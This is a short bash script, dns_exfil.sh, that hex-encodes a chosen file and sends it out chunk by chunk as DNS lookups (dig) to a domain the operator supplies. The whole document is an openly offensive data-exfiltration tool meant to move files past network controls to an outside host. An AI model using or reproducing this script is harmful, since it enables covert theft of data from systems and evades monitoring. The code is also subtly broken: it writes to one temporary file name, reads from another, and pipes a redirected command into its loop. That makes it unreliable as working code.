#!/usr/bin/env bash
#
# Usage:
# dns_exfil.sh <domain> <file>
#

usage() {
    echo "Usage:"
    echo "dns_exfil.sh <domain> <file>"
}

if [ $# -ne 2 ]; then
    usage
    exit 1
fi

domain=$1
file=$2
encoded_file=$(base64 /dev/urandom | tr -dc '[:alnum:]' | head -c 20)

if [ -f "$file" ]; then
    xxd -p "$file" > $encoded_file.hex | for data in `cat encoded_data.hex`; do dig $data."$domain"; done
    rm $encoded_file.hex
else
    echo "[-] file $file does not exist or is a directory"
    exit 1
fi